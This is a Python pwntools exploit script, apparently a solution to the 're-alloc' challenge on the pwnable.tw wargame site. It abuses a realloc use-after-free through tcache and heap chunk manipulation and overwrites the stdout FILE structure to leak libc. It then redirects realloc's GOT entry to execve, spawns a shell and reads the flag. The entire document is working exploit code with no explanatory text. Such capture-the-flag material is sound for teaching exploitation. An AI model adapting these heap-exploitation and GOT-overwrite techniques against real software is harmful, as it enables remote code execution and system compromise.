from pwn import *
elf = ELF("./re-alloc")
libc = ELF("./libc")
ld = ELF("./ld-2.29.so")
context.binary=elf
flag=0
while(flag==0):
		try:
			target=remote('chall.pwnable.tw',10106)
			#target=process([elf.path],env={"LD_PRELOAD":libc.path})
			#context.log_level='DEBUG'

			def sla(string,val):
				target.sendlineafter(string,val)

			def sa(string,val):
				target.sendafter(string,val)

			def init(option1,option2):
				sla("choice: ",str(option1))
				sla("Index:",str(option2))

			def alloc(index,size,data="A"):
				init(1,index)
				sla("Size:",str(size))
				sa("Data:",data)

			def realloc(index,size,data="A"):
				init(2,index)
				sla("Size:",str(size))
				sa("Data:",data)

			def uaf(index):
				init(2,index)
				sla("Size:",str(0))

			def free(index):
				init(3,index)

			chunkarray=0x4040b0
			alloc(0,0x70)#0
			payload=p64(0)*3+p64(0x431)
			realloc(0,0x50,payload)
			free(0)
			alloc(0,0x70)#0
			alloc(1,0x70)#1
			realloc(1,0x40)
			realloc(1,0x70)
			for i in range(4):
				realloc(1,0x50)
				realloc(1,0x70)

			realloc(1,0x50)
			payload="A"*0x40+p64(0)+p64(0x31)
			realloc(1,0x70,payload)
			free(0)
			uaf(1)
			realloc(1,0x70,"\x80")
			alloc(0,0x70)
			realloc(0,0x50)
			free(0)
			realloc(1,0x20)
			free(1)
			alloc(0,0x70)
			free(0)
			alloc(0,0x60)
			alloc(1,0x60)
			realloc(0,0x30)
			free(0)
			realloc(1,0x30)
			free(1)
			alloc(0,0x70)
			realloc(0,0x70,"\x58\x57")
			alloc(1,0x40)
			free(1)
			payload="/bin/sh\x00"+p64(0xfbad1800)+p64(0)*3
			alloc(1,0x40,payload)
			libc_leak=u64(target.recv(16)[8:16])
			libc_base=libc_leak-0x1e7570
			libc_execve=libc_base+libc.symbols["execve"]
			realloc_got=elf.got["realloc"]
			print(hex(libc_base))
			if(libc_base%0x1000==0):
				flag=1
			else:
				target.close()
				continue
			realloc(0,0x50)
			realloc(0,0x70)
			realloc(0,0x30)
			realloc(0,0x70)
			realloc(0,0x30)
			realloc(0,0x70)
			realloc(0,0x30)
			realloc(0,0x70)
			realloc(0,0x30)
			realloc(0,0x50)
			realloc(0,0x30)
			realloc(0,0x50)
			free(0)
			payload="A"*0x10+p64(0)+p64(0x21)+p64(realloc_got)*3+p64(0x21)
			alloc(0,0x60,payload)
			free(0)
			alloc(0,0x50)
			free(0)
			payload=p64(libc_execve)
			alloc(0,0x50,payload)
			init(2,str(1))
			sla("Size:",str(0))
		#	free(0)
			target.sendline("/cat/*/fl*")
			print(target.recv())
		except:
			target.close()
			continue
target.interactive()
